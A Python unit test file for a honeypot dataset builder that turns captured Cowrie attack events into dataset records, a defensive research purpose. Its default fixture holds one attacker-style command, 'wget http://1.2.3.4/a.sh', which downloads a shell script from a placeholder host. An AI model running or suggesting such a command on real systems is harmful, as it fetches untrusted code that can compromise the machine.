"""Isolated unit tests for DatasetBuilder.

Uses directly constructed AttackEvent / ProcessedEvent / EnrichedEvent
objects. Requires no Cowrie, no Docker, no network, no database, no
real log files, and no other external services.
"""

from core.dataset_manager.builder import DatasetBuilder, DatasetRecord
from core.event_engine.event import AttackEvent
from core.log_processor.enricher import EnrichedEvent
from core.log_processor.processor import ProcessedEvent


def _make_enriched_event(
    timestamp: str = "2026-08-19T18:00:22.557428Z",
    source_ip: str = "127.0.0.1",
    session_id: str = "ce82815367a4",
    protocol: str = "ssh",
    honeypot: str = "Cowrie",
    event_type: str = "cowrie.command.input",
    category: str = "command_execution",
    severity: str = "low",
    command: str = "wget http://1.2.3.4/a.sh",
    has_command: bool = True,
    command_length: int = None,
    has_url: bool = True,
    has_ip_address: bool = True,
    has_file_path: bool = False,
    has_shell_metacharacters: bool = False,
) -> EnrichedEvent:
    if command_length is None:
        command_length = len(command)

    attack_event = AttackEvent(
        timestamp=timestamp,
        source_ip=source_ip,
        session_id=session_id,
        protocol=protocol,
        command=command,
        event_type=event_type,
        honeypot=honeypot,
    )
    processed_event = ProcessedEvent(
        original_event=attack_event,
        event_type=event_type,
        normalized_command=command,
        category=category,
        severity=severity,
    )
    return EnrichedEvent(
        processed_event=processed_event,
        has_command=has_command,
        command_length=command_length,
        has_url=has_url,
        has_ip_address=has_ip_address,
        has_file_path=has_file_path,
        has_shell_metacharacters=has_shell_metacharacters,
    )


def test_valid_enriched_event_produces_dataset_record():
    record = DatasetBuilder().build(_make_enriched_event())
    assert isinstance(record, DatasetRecord)


def test_timestamp_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(timestamp="2026-08-19T18:00:22.557428Z"))
    assert record.timestamp == "2026-08-19T18:00:22.557428Z"


def test_source_ip_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(source_ip="10.0.0.5"))
    assert record.source_ip == "10.0.0.5"


def test_session_id_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(session_id="ce82815367a4"))
    assert record.session_id == "ce82815367a4"


def test_protocol_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(protocol="telnet"))
    assert record.protocol == "telnet"


def test_honeypot_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(honeypot="Dionaea"))
    assert record.honeypot == "Dionaea"


def test_event_type_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(event_type="cowrie.login.failed"))
    assert record.event_type == "cowrie.login.failed"


def test_category_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(category="authentication"))
    assert record.category == "authentication"


def test_severity_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(severity="medium"))
    assert record.severity == "medium"


def test_normalized_command_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(command="whomai"))
    assert record.command == "whomai"


def test_enrichment_booleans_are_copied_correctly():
    record = DatasetBuilder().build(
        _make_enriched_event(
            has_command=True,
            has_url=True,
            has_ip_address=False,
            has_file_path=True,
            has_shell_metacharacters=False,
        )
    )
    assert record.has_command is True
    assert record.has_url is True
    assert record.has_ip_address is False
    assert record.has_file_path is True
    assert record.has_shell_metacharacters is False


def test_command_length_is_copied_correctly():
    record = DatasetBuilder().build(_make_enriched_event(command="pwd", command_length=3))
    assert record.command_length == 3


def test_original_processing_information_is_not_modified():
    enriched_event = _make_enriched_event()
    original_command = enriched_event.processed_event.normalized_command
    original_category = enriched_event.processed_event.category
    original_timestamp = enriched_event.processed_event.original_event.timestamp

    DatasetBuilder().build(enriched_event)

    assert enriched_event.processed_event.normalized_command == original_command
    assert enriched_event.processed_event.category == original_category
    assert enriched_event.processed_event.original_event.timestamp == original_timestamp